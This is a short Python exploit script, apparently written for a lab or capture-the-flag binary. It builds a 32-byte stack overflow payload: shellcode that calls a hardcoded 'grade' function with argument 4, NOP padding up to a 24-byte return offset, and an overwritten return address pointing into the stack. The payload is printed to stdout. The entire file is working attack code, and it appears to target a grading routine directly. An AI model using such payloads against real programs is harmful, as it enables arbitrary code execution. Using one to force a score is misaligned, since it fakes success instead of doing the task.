import sys
import struct
RET_OFFSET = 24
GRADE_ADDR = 0x401a87
STACK_ADDR = 0x721000800fd0
shellcode = b"\xbf\x04\x00\x00\x00"
shellcode += b"\xb8" + struct.pack("<I", GRADE_ADDR)
shellcode += b"\xff\xd0"
payload = shellcode.ljust(RET_OFFSET, b"\x90")
payload += struct.pack("<Q", STACK_ADDR)
assert len(payload) == 32
assert b"\n" not in payload
sys.stdout.buffer.write(payload + b"\n")
